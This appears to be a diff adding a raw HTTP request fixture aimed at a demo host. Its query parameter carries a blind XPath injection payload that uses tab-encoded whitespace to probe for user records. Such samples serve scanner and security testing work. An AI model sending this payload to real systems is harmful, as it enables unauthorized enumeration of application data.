@@ -1,0 +1,4 @@
+GET /a?data='%09and%09count(//user)>0%09and%09' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
